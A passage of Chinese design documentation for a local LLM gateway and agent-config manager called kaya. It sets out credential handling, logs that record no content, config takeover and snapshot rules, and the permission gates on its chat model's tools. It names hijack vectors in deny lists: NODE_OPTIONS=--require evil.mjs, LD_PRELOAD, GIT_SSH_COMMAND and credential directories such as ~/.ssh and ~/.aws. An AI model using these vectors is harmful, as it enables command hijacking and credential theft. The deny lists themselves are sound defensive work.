  快照写锁内按 expected bearer 条件执行。刷新失败把 401 原样透传;
  **无凭据类**失败同样按本跳 expected bearer 条件清 route bearer(变
  Passthrough),瞬时失败保留 route 供后续重试。**网关侧只持有解析后的 access
  bearer,仅在进程内存、不落盘**;OAuth token 包(access / refresh)只持久化
  在系统钥匙串(§8),**refresh token 不交给网关路由**,只在壳层刷新 hook
  内使用。网关审计零内容(只记实际路由的 `<provider_id>:<model_id>` 与
  类别计数);OAuth provider 不读残留的 api_key keychain 条目(auth_kind
  切换后的旧 key 不生效)。**端点白名单(review C-1)**:OAuth provider 的
  每个启用端点必须与目录 preset 声明的端点 **同 scheme + host + port** ——
  落库时与每次凭据解析时各校验一次(零网络,fail-closed);手改库 / 备份
  恢复 / UI 笔误把 base_url 指到别的 host 时,真实 access token(含刷新后
  的新 token)不会被发出去。
- **审计零内容**(spec §5/T12,硬不变量):命中事件进 audit JSONL
  (kind `gateway-scrub`,session 固定 `"gateway"`),只记类别计数 /
  字节数 / 路径 / agent / 动作;**绝不记 body / 真值 / 令牌还原值**
  (与现有 scrub 口径一致,有测试锁死)。审计写盘失败跨 sink 落
  warn 级 app_log(不阻断转发)。

**降级与自愈**(spec §3.3/§14.3/§14.5/§15.7;2026-10-14 严格边界改义):

- **退出写回(撤除)**:app 优雅退出 / 网关停止时,已绑定 agent 配置里的
  kaya 托管痕迹被**撤除**(`unapply_config`,幂等,不动用户自有配置)——
  严格边界后 kaya 不再写回任何直连配置(真实 base_url / key 永不落 agent
  配置);下次启动若网关启用再接回网关形态。
- **boot 对账自愈**:进程被 kill 没有写回机会(死配置窗口)——boot
  时对账「配置形态 vs 网关进程状态」,配置指网关而网关未运行 → 立即
  撤除 kaya 托管配置 + warn 级 app_log。**窗口期内的表现 = agent 请求报
  连接错误,重开 kaya 即愈**。
- **运行中的 agent 救不了**(声明为预期行为):写回 / 对账修复的是
  「未来启动的 agent」;网关停止 / 崩溃时**正在运行的** agent 进程
  (env 已注入 `ANTHROPIC_BASE_URL` 等)仍指死端口,请求失败直到用户
  重启该 agent(见 §12)。
- **dev/prod 双 variant 全局互斥**:`~/.kaya/gateway/owner.json`
  (variant + pid + 端口,0o600)声明所有权;后启动的 variant 检测到
  网关被另一 variant 持有时,自身开关置灰,不参与写配置;boot 对账
  顺带清理 stale owner。

**接入与退出:per-agent 开关 + 漂移裁决(2026-10-14,Phase 1.5,spec
§17,用户拍板;同日严格边界修正)**:

- **严格边界(2026-10-14):agent 配置期望态只剩两种** —— 网关形态
  (前提全满足:网关启用 && `via_gateway == true` && 非 claude 排除 &&
  条目有 key)与 **Revoke(无 kaya 配置)**:其余一切情况(网关未启用 /
  via=false / 无 key / claude 被排除)一律 `unapply_config` 撤除 kaya
  标记键(幂等,不动用户自有配置);kaya 痕迹全无时 sync 不把配置加回去。
  **直连期望态已彻底消除:真实 base_url / key 永不落 agent 配置文件**
  (此前「写回直连」的降级路径全部改为撤除)。
- **启用网关不改写任何 agent 配置**:总开关只起 127.0.0.1 listener;
  是否走网关是 **per-agent 开关**(「经网关路由」,Agents 面板每张绑定
  卡片上),**新绑定默认经网关接入(via=true)**。开关置位才触发该
  agent 的 Revoke ↔ 网关形态迁移 —— 配置写入仍收敛在 sync 收敛循环
  (`expected_form` 的网关前提:「enabled && via_gateway && 非
  claude_direct 排除 && 有 key」),写入口不变。
- **开关状态随绑定落库**(库文件 `bindings` 值升格为对象;2026-10-16
  供应商分层起为 `{provider_id, model_id, via_gateway, kaya_managed?}`):
  老 binding(裸字符串 / 缺 `model_id` 的 legacy 载体)首次读时一次性
  回填并落盘,via 回填值 = **网关启用中 || 该 agent 磁盘配置已是网关形态**
  (网关开着 → true 零打扰;crash 残留网关形态 → true 保参与者语义;
  其余 → false),回填后不再缺省。
- **用户改配置的裁决(三态)**:接入中的配置与期望一致 → 不动;
  **部分改动**(kaya 标记还在、值被外部改过)→ 不覆盖、不改回,记
  warn 级 app_log(`drift_conflict:<agent>`)+ 面板「外部已修改」徽标,
  等用户显式「重新接入」;**kaya 托管块被完整移除** → 视为主动取消:
  kaya 对配置文件**零写盘**(用户已自行移除 kaya 痕迹),sync 只落
  `via_gateway=false` 并记 info 日志(`gateway_via_revoked:<agent>`),
  此后该 agent 回到「绑定在、配置用户自管」形态,sync 不再碰它(配置
  已无 kaya 痕迹时不把 kaya 配置加回去)。误删 / 写坏一律落冲突侧
  (安全侧,宁可挂徽标也不替用户决定)。
- 隐私不变量不受影响:路由投影只含 `via_gateway == true` 的绑定
  (未接入 agent 的占位 token 过闸即 401,无路由);鉴权头占位 token 拒发、声明的自定义头检查、Content 顶层模型别名改写、key 驻留内存与审计零内容照旧,不扩成对 Metadata 正文的别名清除保证。

**Claude 排除开关**(spec §7.3/§16-E2;2026-10-14 严格边界改义):默认
已绑定 claude-code 流量也过网关(隐私故事完整:任何 agent 发往任何模型
的字节都过脱敏);Settings 网关区块的「Claude 直连」开关(配置字段沿用
`claude_direct`)语义为 **claude-code 不由 kaya 托管(排除)** —— 路由
不投影、配置期望态 = Revoke(撤除 kaya 标记键,不动用户自有配置),而
不是由 kaya 写一份直连配置。**Claude 订阅 OAuth 不代持**
(Anthropic ToS 明文禁止 intermediate,红线):claude-code 本体走自己
的 `/login`,OAuth 留在 CLI 自己的 keychain;Phase 1 网关只服务
「已绑定条目」的 agent(配置投影以 bindings 为唯一事实源,无绑定的
agent 不写任何 kaya 配置),OAuth 代持与未绑定形态的透传留后续阶段
(2026-10-17 Phase 3 起 Kimi device flow 已接入统一 resolver——token 仍
只存本机钥匙串,网关只收解析后的 bearer;OpenAI / Anthropic 的 OAuth
仍为 coming 占位,不启动、不代持)。**路由口径(Phase 1.6,2026-10-14,如实声明)**:
除绑定投影外,请求体别名命中**全量库条目目录**的同族条目即按该条目
选路并注入其 key(`resolve_alias_route`,未知 / 跨族别名结构化 400
fail-closed)——「谁能花哪条条目的 key」以目录 + 别名为准,不要求
该条目处于绑定状态;这与上文 key 驻留段(全量条目 key 驻留网关
内存)及本地威胁模型段同一口径。
同理,已绑定但条目**无可用凭据**的 agent(api_key 为空 / OAuth 未登录或
已过期)即使网关启用且已接入(via=true)也落 Revoke,撤除发生的那轮
记 warn 级 app_log(`gateway_no_key_revoked:<agent>`)+ 面板提示(2026-10-14
复审收口;2026-10-18 review 起 OAuth 的凭据判定是**本地 access token 非空 +
未标 expired + 端点过白名单**,零网络;`expired` 视同无凭据,同时影响网关
路由注入、Chat 解析与 agent 配置期望态,重新登录清除该标记后恢复网关形态):
网关没有凭据可注入,占位 token 只会顶掉 agent 自身的 auth 回落(出站无真
凭据注入 → 上游静默 401)。

**与既有 PII 规则的偏差(拍板,2026-10-13,如实声明)**:spec §6.6
原案的结构化 PII 含 IP 地址类,**Phase 1 不实现 IP 类检测**——编码
流量中 IP 高频低敏(loopback / RFC1918 为主),公网 IP 判定需要范围
逻辑,Phase 1 成本不成比例;spec 该行的 IP 登记为偏差,Phase 2 再
评估。**后果:经网关出站的请求里的公网 IP(如用户基础设施地址)
不脱敏**;用户可用用户令牌表手动覆盖个别地址。Chat 链路 scrub 的
既有行为不受此偏差影响。

**本地威胁模型边界(2026-10-15 发版 review,如实声明)**:网关只绑
`127.0.0.1`,入站只校验占位 token 形态;占位 token 是写在 agent
配置文件里的用户可读随机串——**能读到本机用户文件的同机进程即可
借网关出站消费库条目的真实 key / OAuth bearer**(Phase 1.6 起全量
条目 key 驻留网关进程内存;Phase 3 起 OAuth bearer 同样驻留内存)。这是本机回环代理的架构共性(CC Switch 等同类方案
相同):**同机恶意进程不在本产品威胁模型内**——kaya 的隐私设计防的
是「数据未经授权离开本机」与「LLM 越权读文件」;一个已拥有用户级
本机执行权的攻击者本就能直接读取钥匙串之外的任何用户文件。本声明
与 §8.2(快照域 0o700/0o600 防的是同机其他用户与意外读取,不是
root/本机攻击者)同一口径。

**严格接管与快照整节(2026-10-19,全量模型目录接管,spec
`docs/superpowers/specs/2026-10-19-agent-gateway-full-catalog-takeover-design.md`
§7/§8/§13)**:agent「经网关接入」(`via_gateway=true`)后,kaya 托管
该 agent 的**模型面**(provider 块 / kaya 模型条目 / 默认模型指针 /
原生 picker·catalog 模型清单 / opencode 的 `enabled_providers` 隐藏
门),不托管 permissions / hooks / MCP / plugins / tune 等其它用户
设置。接管语义与隐私不变量:

- **快照 v2(整节)**:接管前逐键快照扩展为「keys + 整节 sections」
  (kimi 的 `providers` / `models` 表、opencode 的 `provider` 节 /
  `enabled_providers`、codex base 的对应键)——`~/.kaya/agent-config-
  snapshots/<agent>.json`,**目录 0o700 / 文件 0o600 原子写**;含用户
  原值(可能含用户自配第三方网关的 base_url / token),内容**绝不进
  日志 / 审计 / debug dump**,且 `agent-config-snapshots/**` 从所有
  诊断包 / debug 导出 / 支持文件里**显式排除**(有测试锁死)。
- **per-agent 文件锁 + 快照代际**:每 agent 一把文件锁
  (`<agent>.lock`,`create_new` + 陈旧锁清理)覆盖「读配置 → 快照
  捕获 → 写配置 → 读回校验」全临界区;**快照已存在就绝不覆盖**
  (两个实例同时接入时后写者复用,不覆盖别人的接管前原值);锁内写入
  一律 tmp+rename 原子写。
- **删除式接管(kimi)与合并恢复(§8.5)**:「接管时已存在」的非 kaya
  条目先快照再删除/隐藏;「接管后新增」的保留不删。恢复(Revoke /
  停网关 / 退出写回 / boot 崩溃对账四处共用同一实现)只补回快照里
  缺失的条目、**当前值优先**(留痕 `snapshot_merge_kept_current`,
  info 级),读回不一致记 `snapshot_restore_mismatch`(只记数量不记
  名称);恢复写盘走 `write_atomic` **不产 `.bak`**——`.bak` 只在
  常规配置写入与 v1→v2 快照升级两处既有路径出现(终裁语义见 spec
  §8.4,消除与原「恢复前先写 .bak」句的字面张力)。
- **v1 快照兼容与 v1→v2 升级**:v1 快照(无 sections)Revoke 永远可
  完成(纯摘除 + keys 写回,记 info `snapshot_v1_no_sections`,不
  阻塞);首次 sync 时升级——抓取非 kaya 整节进 v2 sections,原 v1
  文件留底 `<agent>.json.v1.bak`;抓取失败**不删**非 kaya 条目。
- **诊断排除**:快照(含 `.v1.bak`)同权限 0o600,且整目录排除在
  诊断导出外——快照是「真实 key 不落盘」口径的唯一明示例外,防护
  依赖 `~/.kaya` 域权限(§8.2 表)。
- **fail-closed 出站**:全量目录接管后,agent 的内容请求
  (含内部小任务——claude 标题生成的 small-fast / haiku 键、codex
  压缩/摘要、opencode 标题)默认**必须**带 `kaya/<别名>` 模型名;裸模型名
  在网关侧 400 `kaya_gateway_unmanaged_model`(自解释错误体:
  code / message / hint / docs_url),绝不转发;`GET|HEAD /health`、
  `/healthz` 探活本机自答 200、不要求 token、不计数不审计。网关
  拒绝日志只记 reason 类别,不记 body / 模型名。
  - **唯一窄例外是显式「全局接管 codex」的 ChatGPT Responses 路由**：
    base provider 写入内部头 `x-kaya-codex-global-takeover: 1`；普通
    `--profile kaya` 显式写入禁用值 `0`，避免 Codex 深合并时继承 base
    的启用值。仅当 Codex 占位 token、启用头与 ChatGPT Responses 绑定三者
    同时成立时，允许 Codex 切换内置裸模型名；Metadata、其它 agent、其它
    provider 与普通第三方工具仍按裸名 400。该头属于保留头，转发前剥离，
    绝不上行至 OpenAI，也不能由模型库自定义头注入。
- **边界与已知限制(如实声明)**:
  - v1→v2 库迁移后,既有 v2 store 里模型的 `slug=None` 是**过渡态**
    ——下次 upsert 该 provider 时经 `ensure_model_slugs` 回填,不做
    boot 全量清扫(过渡期内该 provider 的多模型行经 legacy 回退别名
    双查仍可解析,同族 ≥2 个启用模型时网关按 `RejectAmbiguous` 400,
    picker 侧「同族唯一才广告」收窄)。
  - **Metadata 正文直通例外**:普通原生路由允许直通的元数据请求(如 `POST /v1/models`)携带可解析的 `kaya/<alias>` 时,正文保持原样并发往绑定上游,不按该别名切换路由。`GET|HEAD /v1/models` 清单和 `GET /v1/models/{id}` 由本机自答。Anthropic `count_tokens` 不属于 Metadata,而是 Content,同样过令牌化与顶层模型改写;适配器与 ChatGPT 路由另受精确端点限制,不支持时在本机拒绝。鉴权占位 token 拒发与自定义头检查不等于检查所有元数据正文。
  - 快照 `.v1.bak` **恢复成功后随快照一并删除**(用户原值已写回配置,
    留底只是多余的**明文密钥副本**);恢复失败时**保留**(可能是用户
    原值的最后一份)。损坏快照(文件在但解析失败)boot 对账留 warn
    `snapshot_corrupt:<agent>` 且**保留文件**(不静默跳过、不自动
    删除);恢复写盘 `Err` 分支按 spec **重试一次**(快照保留,两轮都
    失败才判 `snapshot_restore_failed`)。
  - **「删 / 覆写用户自有值」一律以「能恢复」为前提**(2026-10-20,同一
    条契约覆盖三个面):
    - **根因(capture 侧)**:接管快照的「接管前状态未知」占位语义**只适用
      于盘上已经是 kaya 形态的配置**。capture 的实参取**盘上真实的 kaya
      标记状态**(读标记失败 → fail-closed 取「非占位」):无标记 = 盘上是
      用户自己的配置 → 走**真拍**,用户原值(`env.ANTHROPIC_API_KEY` /
      `env.ANTHROPIC_BASE_URL` / `env.ANTHROPIC_MODEL` / kimi 的
      `default_model` / opencode 的 `model` / 各 provider·models 整节)
      逐字进快照 → 接管时删掉 / 覆写它们**可恢复**(Revoke / 崩溃对账
      写回)。若快照里没有用户原值却照样删 / 覆写,就是不可恢复的数据损失。
    - **消费侧(删键)**:claude 的 `env.ANTHROPIC_API_KEY` 只在**快照里
      存着「将被删掉的盘上那个值」**时才删;快照没有 / 是旧值 → **保留**
      并留痕 `claude_user_api_key_kept:claude-code`。**思考能力 / effort
      四键**(`ANTHROPIC_DEFAULT_{OPUS,SONNET,HAIKU}_MODEL_SUPPORTED_CAPABILITIES`
      / `CLAUDE_CODE_EFFORT_LEVEL`,2026-10-24)同一口径的**逐键所有权
      证据闸**:快照 `keys` 记着同一个值(或记着 `None` = 接管前不存在)
      才删;或当前值等于上一轮**真实 apply + 读回通过**记下的
      `last_applied_values` 才删;其余(旧 v2 快照没有这些键 / 无快照 /
      快照损坏)一律**保留**——旧快照恢复不回来,删了就是不可恢复的损失。
    - **消费侧(Revoke 的幂等性,2026-10-24)**:第二轮 Revoke 不得把上一轮
      恢复出来的**用户自有值**当 kaya 痕迹删掉。判据是「盘上还有没有
      **kaya 形状**的痕迹」(kaya 标记 / 占位 token / `kaya/` 别名 / kaya
      provider 块 / 接管快照还在),而不是「盘上有没有值」—— 否则
      `base_url` / `model` / token 会被无条件摘除且快照已删、恢复不回来。
    - **消费侧(覆写键)**:端点 / 模型指针类受管键(claude 的
      `env.ANTHROPIC_BASE_URL` / `env.ANTHROPIC_MODEL` / `model`、kimi 的
      `default_model`、opencode 的 `model`)在**盘上已是 kaya 形态**或**有
      一份真拍快照**时才覆写;两者皆无(快照缺失 / 只记了「不知道」)→
      **本轮不覆写**,只写 kaya 自有命名空间 + 留痕
      `takeover_not_restorable:<agent>`。
    - 删除式接管(kimi 外来条目 / opencode 外来 provider 块 / codex
      base)同样要求快照可用:快照不可用时只写 kaya 命名空间,不删。
    - **「用户改过值」的漂移**由 §17.4 裁决拦(标记在 + 值被改 → 冲突待
      裁决,不覆盖),上述闸只管「快照缺失 / 占位」这一类不可恢复面。
  - **真机验证清单**(发版前):claude `--settings` 隔离文件在旧版本
    claude 的兼容下限;opencode `enabled_providers` 门的版本阈值
    (当前启发式 1.18.0);codex catalog 的 vision modality 字段
    (2026-10-20 批次一改为按模型 vision 有效值覆写 `input_modalities`
    —— 字段名以本机 `codex debug models --bundled` 实测为准,目录里
    **没有** `supports_vision` 字段;写错字段会导致 catalog 解析失败,
    仍需真机确认)。

**批次一新增面(2026-10-20,模型网关 × Agent 配置可用性批次一,spec
`docs/superpowers/specs/2026-10-20-agent-gateway-usability-batch1-design.md`
§4/§5/§6/§9/§10)**:网关侧新增「provider 级自定义头」「会话指纹」
「上游挂死兜底」三块能力,外加桌面侧的供应商连通性自检与投影诊断
透明化。隐私口径:

- **provider 级自定义头 `extra_headers`(准敏感)**:模型库 v2 的
  `ModelProvider` 新增 `extra_headers`(`BTreeMap<头名, 值>`),随库
  文件 `~/.kaya/model-library.json` 落盘(0o600 原子写,与既有库文件
  同权限)。**值按准敏感数据处理**:绝不进 app_log / 审计 / debug
  dump / LLM 上下文;头名 / 头值**零留痕**(注入函数返回条数,但调用
  方当前**丢弃**该计数 —— 连「注入了 N 个头」都不记)。**本批次
  UI 无编辑控件**:值只经「目录预填」进入库文件(OpenCodeGo /
  OpenCode 预设由 overlay 预置 `x-opencode-session =
  $KAYA_SESSION_FINGERPRINT`;用户亦可直接改库文件)。值随 IPC 进入
  WebView 运行时镜像,用于草稿往返保留,不渲染、不进 localStorage
  persist、日志、审计或 LLM 上下文;语义校验全在 Rust 侧 upsert 漏斗。后续若加 UI,须
  提示「勿存放 API key 类凭据,凭据请用 API Key 字段」。
  - **保留名校验**:头名禁 `authorization` / `x-api-key` / `host` /
    `content-length` / `connection` / `transfer-encoding` /
    `accept-encoding` / `keep-alive` / `te` / `trailer` / `upgrade`
    与 `proxy-*` 前缀(与网关逐跳剥离面**同一张表**,单一来源
    `is_reserved_extra_header_name`),且必须是 ASCII token、≤64
    字符;值 ≤512 字节、禁控制字符。校验在模型库 upsert 漏斗,
    **非法拒写**。
  - **注入时序**:令牌化之后 → 鉴权注入 → `inject_extra_headers` →
    占位符硬断言。注入的头名 / 头值**同样过占位符断言**:占位 token
    (`kayagw_`)与别名(`kaya/`)两种形态都绝不出网关(字节级子串
    搜索,非法 UTF-8 头值不得绕过)。入站请求已自带同名头(大小写
    不敏感)→ 跳过注入(agent 自发的优先,端到端透传语义不变)。
    注入失败(非法头值 / 哨兵求值失败)按「跳过该头」降级,**不
    阻断请求**。
  - **自定义头不进 agent 配置**:它是**路由属性**,只在网关出站按
    provider 注入 —— 写进 agent 配置的头会被网关透传给所有上游
    provider(MiniMax 的头串到 DeepSeek),严格边界不变。
- **会话指纹 `$KAYA_SESSION_FINGERPRINT`**:自定义头值支持动态哨兵,
  请求期求值为会话指纹 = SHA-256(令牌化后 body 的 `system` + 首条
  user 消息,递归剥 `cache_control`)前 32 hex、加 `kaya-` 前缀。
  - **单向**:SHA-256 不可逆,指纹**不映射回内容**,不含任何可还原的
    正文片段(令牌是内容寻址 HMAC,真值不出哈希)。
  - **不出网关**:指纹只作为出站自定义头的值发往**该 provider 自己
    的端点**,不进日志 / 审计 / debug dump / LLM 上下文。
  - **兜底不落盘**:body 非聊天形态 / 求值失败 → 用路由级稳定随机值
    (`kaya-<uuid>`,随 `EntryRoute` 存活,**不落盘**;每次快照装配重新
    铸,跨快照不可预测 —— 会话亲和由 body 指纹承担,兜底只保证「有值
    可发」);未知 `$KAYA_` 哨兵 → 跳过该头,绝不把哨兵字面量发出
    网关。
- **上游挂死兜底**:「等响应头」段(`send()` 到拿到响应头:写请求体
  停滞 + 等响应头)有 300s time-to-headers 超时(与流式 / 非流式无关的
  统一上限;401 重放两跳同覆盖),超时 504 结构化收口;流式响应的
  **帧间隔**看门狗(默认 120s,网关 config
  可配 `stream_idle_timeout_secs`,持久化同 scrub 档位)—— 只约束帧
  间隔,**不给流加总时长上限**;非流式请求另有 300s 总超时(超时 504
  结构化收口)。非流式成功与适配错误响应均分块读取,累计 body（含 SSE
  嗅探前缀）最多 64MiB；超出立即停止读取,按入站协议返回 502
  `kaya_gateway_upstream`,记 `upstream_error`,错误不含响应原文。
  中止 / 断流时按**入站协议**发一帧终结信号(Anthropic
  `event: error` / Chat 错误 chunk + `[DONE]` / Responses
  `response.failed`,**绝不出 `completed`** —— 适配入站恒 Responses)
  再正常关流,agent 侧表现为「一次失败请求」由自带重试接管,替代
  无限挂死 / 裸截断。app_log warn `gateway_upstream_idle_timeout` /
  `gateway_upstream_stream_error` / `gateway_upstream_nonstream_timeout` /
  `gateway_upstream_headers_timeout`
  **零内容**:不记 body、不记 URL、不记 key、不记响应体。四者都带
  `route_entry` = 实际路由的 `<provider_id>:<model_id>` —— **模型 id
  属配置元数据,可携带**(与 `gateway_projection_excluded` 一节里
  模型 id 的口径相同),它不是「内容」。秒数只有 idle / 非流式总超时 /
  响应头超时三个事件带(`idle_secs` / `timeout_secs`);**断流事件
  `gateway_upstream_stream_error` 不记秒数**(断流没有空闲窗口可记)。
  计数经 `gateway_get_status` 的 `upstream_timeouts` /
  `upstream_stream_errors` 透出(纯计数)。
- **投影诊断透明化(2026-10-20 批次一 §5)**:投影被四条件排除的模型
  不再静默丢弃 —— `gateway_get_status.projection_diag` 回传
  per-agent 明细(provider_id / provider_name / model_id / reason)。
  **模型 id 属配置元数据,可携带**(让用户看得见「为什么没接进来」);
  但 app_log `gateway_projection_excluded` **只记计数与 reason 分布,
  不记模型 id 清单** —— 与审计零内容口径一致。
- **供应商连通性自检 `model_provider_test_connection`**:桌面侧命令,
  语义是「端点能不能完成一次 HTTP round-trip」——
  - **凭据只进鉴权头**:`Authorization: Bearer`(api_key 的
    chat/openai 与**所有**协议的 OAuth)或 `x-api-key` +
    `anthropic-version`(api_key + anthropic);本地端点(Ollama /
    vLLM 类)允许免 key 探测。凭据不进 URL、不进 body、不进日志。
  - **响应 body ≤64 KiB 读完即弃**:不解析、不落盘、不进日志。判定在
    **headers 到达时**即刻完成(body 拖死不得把一个已应答的 200 改判
    成 timeout)。
  - **任何 HTTP 响应都算端点可达**:2xx/3xx → `ok`;401/403 → `auth`
    (「可达,凭据可能无效」);其余 → `http_status` +
    `http_status:<code>`;超时 → `timeout`;传输失败 → `network`;
    oauth 未登录 / 过期 → `skipped_oauth`(**零网络**)。**不验证模型
    可用性**、**不写库**、无轮询。
  - **固定哨兵错误族**:预检失败(库读 / keychain 读 / 无端点 / 非法
    base_url / 远程缺 key / provider 不存在)一律复用 `model_fetch_*`
    哨兵,原始错误串**不上 wire**(前端按哨兵本地化)。app_log 只记
    `{provider_id(钳制), status, latency_ms, error}` —— URL / key /
    body 不进日志。

### agent 上下文分层(2026-09-24)

- **活动台账与定位注入**:watcher 事件(payload 出口已过 scrub)在注册表内滚动保留每 agent 最近 20 条状态摘要,连同 cwd(用户终端 OSC 7 上报)、pane 项目标签(用户自填)、kaya 自己的派发记录,经既有指纹去重注入 LLM 上下文;信任等级与既有态势块一致,不新增外发面。注册表纯内存,不落盘。
- **agent_report 工具**:按需读取 `~/.kaya/terminal/<tab_id>.log` 尾部(默认 64KB,上限 256KB),是 terminal_read 窗口的扩大,同一信任等级。隐私不变量:输出先经 AnsiCleaner 还原终端行覆写(\r / ESC[K / \x08 / 折行拼接,防 zsh 重绘把 secret 切碎)、后过 output scrub(~30 类 secret/PII 正则 + PEM 整块 redact);顺序有测试锁死。

**list_dir 目录列举(沙盒 + 凭证目录硬拒)**:chat 的 `list_dir` 工具只能列举 `cwd ∪ home ∪ ~/.kaya/` 并集内的目录(canonicalize 后逐组件前缀比较,符号链接逃逸一并拒),且**只回文件名、不回内容**。2026-10-04 起 home 下的凭证目录(`~/.ssh` / `~/.aws` / `~/.gnupg` / `~/.docker` / `~/.kube` / `~/.azure` / `~/.password-store` / `~/.config/gh` / `~/.config/gcloud` / `~/Library/Keychains` 及其任意子目录)**硬拒**(此前防护只是工具描述里的 prompt 级请求)——枚举即信息泄露:知道 `id_rsa` 存在,攻击者就能在后续调用里定点。

**Agent 配置文件读写(2026-08-17,P2-F1;codex 2026-09-08)**:chat 的 `agent_config` 工具可读取/修改四个受支持编程 agent 的 CLI 配置文件:claude-code → `~/.claude/settings.json`、kimi-code → `~/.kimi-code/config.toml`、opencode → `~/.config/opencode/opencode.json`、codex → `$CODEX_HOME/config.toml`(CODEX_HOME,缺省 `~/.codex`)。
- **读取**:`action="read"` 返回的内容先做键名脱敏(key/token/secret/password 命名的键只回前 4 字符 + `***`),再整体过一遍 secret scrubber 兜底(非敏感键名下的 secret 也不会发给模型)。
- **修改需显式授权**:`action="edit"` 是持久写入——每次修改都必须经你在对话中的授权卡片确认后才落盘;授权卡片只展示目标文件路径与待合并的顶层**键名**(patch 的值可能含密钥,从不上卡片、不进事件)。授权存内存、绑定 (会话, agent),新聊天会话会重新询问,app 重启清空。未授权时模型只收到「等待用户确认」的提示,不会写入任何字节。
- **写前备份**:每次写入先把旧版本备份为 `<file>.bak`;深合并保留 patch 未提及的既有字段。
- **执行/提权类顶层键一律拒绝(按 agent 的拒键表,v2.1.10 起按 agent 区分;codex 表 2026-09-08)**:这类键可在 agent 后续运行时装订任意命令、或整体关掉 agent 自己的权限闸,经本工具的合并请求会被直接拒绝(连授权卡片都不会出现),需你手动编辑配置文件。拒键表:claude-code → `hooks` / `statusLine` / `apiKeyHelper` / `enabledPlugins` / `permissions`;opencode → `hooks` / `plugin` / `mcp`;codex → `hooks` / `approval_policy` / `sandbox_mode` / `sandbox_workspace_write` / `rules` / `mcp_servers` / `notify` / `projects`;kimi-code 及其它 agent 保留通用 floor `hooks`。
- **模型身份键同样一律拒绝(2026-09-10)**:claude-code 的 `model` / `modelPicker` 与 `env` 子表 16 键(`ANTHROPIC_BASE_URL` / `ANTHROPIC_MODEL` / `ANTHROPIC_AUTH_TOKEN` / `ANTHROPIC_API_KEY` / `ANTHROPIC_SMALL_FAST_MODEL` / `ANTHROPIC_DEFAULT_{OPUS,SONNET,HAIKU}_MODEL` / `ANTHROPIC_DEFAULT_{OPUS,SONNET,HAIKU}_MODEL_NAME` / `CLAUDE_CODE_MAX_CONTEXT_TOKENS` / `ANTHROPIC_DEFAULT_{OPUS,SONNET,HAIKU}_MODEL_SUPPORTED_CAPABILITIES` / `CLAUDE_CODE_EFFORT_LEVEL`,大小写不敏感、按点分路径点名)、kimi-code 的 `providers` / `models` / `default_model`、opencode 的 `provider` / `model`、codex 的 `model` / `model_provider` / `model_providers` / `model_catalog_json` / `model_reasoning_effort` —— 同样在授权闸之前整次拒绝,文件与 `.bak` 都不被触碰。模型配置的统一入口是模型库(设置 → 模型),agent 配置文件是库条目的投影,只由 kaya 收敛写入;拒绝文案指向模型库,不引导用户手编配置文件。codex 的 `model_providers` 由此整表拦下,原先单独兜底的嵌套拒键 `model_providers.<id>.auth`(2026-09-08 终审)已被它吸收、随之删除(不留死代码;`denied_patch_nested` 保留为扩展点,当前恒 `None`)。授权落库命令 `agent_config_edit_respond` **有意不接**这类拒键:它们在工具层授权闸之前就被拒、永远不会进入 grant 集合,不接是为了不改变安全闸「已批准键集合」的语义。`action="read"` 不受影响 —— 排查配置问题时模型仍能看到当前生效的 base_url / model。
- **危险环境变量同样一律拒绝(2026-10-04 review M2;独立评审 I5 补键)**：授权按**顶层键集**绑定 —— 卡片上批准一次 `env`，模型此后即可写任意子键值；`env` 子表的危险变量名（`NODE_OPTIONS` / `NODE_PATH` / `DYLD_INSERT_LIBRARIES` / `DYLD_LIBRARY_PATH` / `LD_PRELOAD` / `LD_LIBRARY_PATH` / `PATH` / `BASH_ENV` / `ENV` / `PYTHONSTARTUP` / `GIT_SSH_COMMAND` / `GIT_SSH` / `GIT_EDITOR` / `EDITOR` / `VISUAL`，大小写不敏感、全 agent 通用、按点分路径点名）是代码执行 / 命令劫持通道（`NODE_OPTIONS=--require evil.mjs` 对 Node 系 agent 启动即执行；`GIT_SSH_COMMAND` 把下一次 git fetch/push 变成任意命令执行），与身份键同一检查点（授权闸之前整次拒绝，`apply_patch` 兜底，文件与 `.bak` 都不被触碰）。与模型身份键的区别：这些键没有 kaya 管理入口，拒绝文案引导**手动编辑**。模型库同步路径不经 `apply_patch`（生产唯一调用方是 agent_config 工具），不受影响。**已知边界**：该表是枚举式，不穷尽所有执行面 —— `PYTHONPATH` / `PERL5LIB` / `RUBYLIB` 的 module shadowing 对当前内置 agent（Node/Rust 系）无执行面，暂未列入；方向是 fail-closed 增量补，发现新通道即加。
  - **边界(2026-09-10 终审,如实说明;2026-10-04 更新)**:`env` 子键的身份键检查是**白名单式拒绝** —— 只拒上表枚举到的那 16 个,其余 `env.*` 子键仍可写(例如 `ANTHROPIC_BEDROCK_BASE_URL` / `ANTHROPIC_VERTEX_BASE_URL` / `CLAUDE_CODE_USE_BEDROCK` / `CLAUDE_CODE_USE_VERTEX` / `CLAUDE_CODE_PROVIDER_MANAGED_BY_HOST` —— 这些能改走 Bedrock / Vertex 端点或改变供应商归属,理论上属同类风险,但把它们扩成「`env` 前缀规则」是改变安全表语义的改动,应独立决策,不在本次收敛内)。2026-10-04 起另有一张**危险变量名拒表**(上一条,`denied_dangerous_env_key`)与身份键表并行,覆盖代码执行类变量。另一个如实说明:授权卡片只列**顶层键名**(这里就是 `env` 一个词),**不会**展开子键 —— 因此一次获批的 `env` 合并请求,其子键对你是不可见的。要收紧身份键边界时,先改 `denied_model_identity_keys` 的枚举,再同步这张表。
- **审计**:每次授权请求与每次成功写入各记一条本地 App 日志(`~/.kaya/logs/`,含 agent、文件路径、合并的顶层键名——**绝不含值**)。
- **命令行版(kaya-cli)**:无授权卡片界面,`edit` 一律自动拒绝并提示你手动编辑;`read` 可用且走同一脱敏管道。

**Agent 安装/更新/卸载(agent_manage,2026-08-21;卸载 2026-08-27)**:chat 的 `agent_manage` 工具是 Agents 面板「安装 / 更新 / 卸载」按钮的**聊天等价物**——你说「帮我装 claude-code」时,模型经它发起与面板按钮完全相同的后台任务(同一单任务闸、同一事件流、同一 App 日志)。
- **只执行 catalog 固定命令**:工具参数只有 `action`(status/install/update/uninstall 枚举)和 `agent_id`(内置 catalog 白名单校验),**没有任何自由命令参数**;实际执行的命令(npm/brew/script)完全由编译期内置 catalog 决定,模型无法注入自己的 shell。
- **为什么不经 run_shell 五道关卡**:那五道关卡(policy gate / safety gate / execute 隔离等)防的是 LLM 生成的 shell 文本;本工具没有 LLM 生成的命令,也没有用户数据外发面——不读任何文件内容、输出只有安装状态文本(且照常过 output scrub)。`status` 的探测方式与 Agents 面板同源(本机 PATH 探测 + `--version`,数据不出本机)。
